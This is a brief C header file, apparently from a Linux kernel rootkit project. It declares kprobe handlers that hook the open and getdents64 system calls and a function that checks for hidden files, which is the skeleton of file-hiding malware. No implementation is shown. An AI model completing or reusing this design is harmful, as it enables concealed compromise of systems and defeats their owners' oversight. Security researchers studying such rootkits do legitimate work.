#include "rootkit_cmd.h"
#include <linux/module.h>

void sys_open_kprobe_enter_handler(char *__user filename,
                                   struct rootkit_cmd *cmd);

bool is_hidden_file(const char *str);

void sys_open_kprobe_exit_handler(struct pt_regs *syscall_regs,
                                  struct rootkit_cmd cmd);

void sys_getdents64_kprobe_exit_handler(struct pt_regs *regs,
                                        struct rootkit_cmd syscall_metadata);
